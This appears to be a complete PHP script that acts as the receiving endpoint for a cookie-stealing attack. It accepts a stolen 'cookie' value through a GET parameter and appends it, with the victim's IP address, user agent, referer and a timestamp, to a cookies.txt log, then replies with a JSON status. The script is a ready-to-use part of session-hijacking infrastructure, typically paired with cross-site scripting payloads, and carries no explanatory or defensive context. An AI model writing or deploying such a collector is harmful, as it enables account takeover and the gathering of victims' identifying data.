<?php

$date = date("Y/m/d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'];
$cookie = $_GET['cookie'];

$file = fopen("cookies.txt", "a");
fwrite($file, "[+] Date: {$date}\n[+] IP: {$ip}\n[+] UserAgent: {$user_agent}\n[+] Referer: {$referer}\n[+] Cookies: {$cookie}\n---\n");
fclose($file);

echo(json_encode(["status" => 200]));
